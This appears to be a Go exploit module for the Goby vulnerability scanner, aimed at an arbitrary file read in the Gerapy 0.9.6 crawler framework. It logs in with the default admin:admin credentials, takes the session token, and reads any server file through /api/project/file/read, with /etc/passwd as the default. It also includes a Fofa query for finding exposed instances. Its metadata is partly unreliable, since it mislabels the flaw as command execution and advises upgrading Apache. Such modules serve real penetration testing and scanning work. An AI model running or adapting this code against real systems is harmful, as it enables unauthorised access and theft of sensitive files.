package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Gerapy 0.9.6 Arbitrary File Read",
    "Description": "<p>Gerapy is a distributed crawler management framework based on Scrapy, Scrapyd, Django and Vue.js.</p><p>There is an arbitrary file reading vulnerability in the background of Gerapy 0.9.6 (default password admin:admin). An attacker can use this vulnerability to obtain sensitive information to further take over the system.</p>",
    "Impact": "Gerapy 0.9.6 Arbitrary File Read",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://github.com/Gerapy/Gerapy/releases\">https://github.com/Gerapy/Gerapy/releases</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. Upgrade the Apache system version.</p>",
    "Product": "Gerapy",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "Gerapy 管理框架 0.9.6 版本 后台任意文件读取漏洞",
            "Description": "<p>Gerapy是一款基于Scrapy、Scrapyd、Django和Vue.js的分布式爬虫管理框架。</p><p>Gerapy 0.9.6版本后台存在任意文件读取漏洞（默认密码admin:admin）。攻击者可利用该漏洞获取敏感信息进一步接管系统。</p>",
            "Impact": "<p>Gerapy 0.9.6版本后台存在任意文件读取漏洞（默认密码admin:admin）。攻击者可利用该漏洞获取敏感信息进一步接管系统。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新： <a href=\"https://github.com/Gerapy/Gerapy/releases\">https://github.com/Gerapy/Gerapy/releases</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、升级Apache系统版本。</p>",
            "Product": "Gerapy",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Gerapy 0.9.6 Arbitrary File Read",
            "Description": "<p>Gerapy is a distributed crawler management framework based on Scrapy, Scrapyd, Django and Vue.js.</p><p>There is an arbitrary file reading vulnerability in the background of Gerapy 0.9.6 (default password admin:admin). An attacker can use this vulnerability to obtain sensitive information to further take over the system.</p>",
            "Impact": "Gerapy 0.9.6 Arbitrary File Read",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://github.com/Gerapy/Gerapy/releases\">https://github.com/Gerapy/Gerapy/releases</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. Upgrade the Apache system version.</p>",
            "Product": "Gerapy",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "body=\"Gerapy\"",
    "GobyQuery": "body=\"Gerapy\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://github.com/Gerapy/Gerapy",
    "DisclosureDate": "2021-11-28",
    "References": [
        "https://github.com/Gerapy/Gerapy/issues/210"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "6.0",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "filepath",
            "type": "input",
            "value": "/etc/",
            "show": ""
        },
        {
            "name": "filename",
            "type": "input",
            "value": "passwd",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [
            "Gerapy"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10239"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri1 := "/api/user/auth"
			cfg1 := httpclient.NewPostRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("Content-Type", "application/json;charset=UTF-8")
			cfg1.Data = `{"username":"admin","password":"admin"}`
			if resp1, err := httpclient.DoHttpRequest(u, cfg1); err == nil {
				if resp1.StatusCode == 200 && strings.Contains(resp1.RawBody, "token") {
					tokenFind := regexp.MustCompile("\"token\":\"(.*?)\"").FindStringSubmatch(resp1.RawBody)
					uri2 := "/api/project/file/read"
					cfg2 := httpclient.NewPostRequestConfig(uri2)
					cfg2.VerifyTls = false
					cfg2.FollowRedirect = false
					cfg2.Header.Store("Content-Type", "application/json;charset=UTF-8")
					cfg2.Header.Store("Authorization", "Token "+tokenFind[1])
					cfg2.Data = `{"path":"/etc/", "label":"passwd"}`
					if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
						return resp2.StatusCode == 200 && regexp.MustCompile("root:(x*?):0:0:").MatchString(resp2.RawBody)
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			filepath := ss.Params["filepath"].(string)
			filename := ss.Params["filename"].(string)
			uri1 := "/api/user/auth"
			cfg1 := httpclient.NewPostRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("Content-Type", "application/json;charset=UTF-8")
			cfg1.Data = `{"username":"admin","password":"admin"}`
			if resp1, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil {
				if resp1.StatusCode == 200 && strings.Contains(resp1.RawBody, "token") {
					tokenFind := regexp.MustCompile("\"token\":\"(.*?)\"").FindStringSubmatch(resp1.RawBody)
					uri2 := "/api/project/file/read"
					cfg2 := httpclient.NewPostRequestConfig(uri2)
					cfg2.VerifyTls = false
					cfg2.FollowRedirect = false
					cfg2.Header.Store("Content-Type", "application/json;charset=UTF-8")
					cfg2.Header.Store("Authorization", "Token "+tokenFind[1])
					cfg2.Data = fmt.Sprintf("{\"path\":\"%s\", \"label\":\"%s\"}", filepath, filename)
					if resp2, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil && resp2.StatusCode == 200 {
						expResult.Output = resp2.RawBody
						expResult.Success = true
					}
				}
			}
			return expResult
		},
	))
}
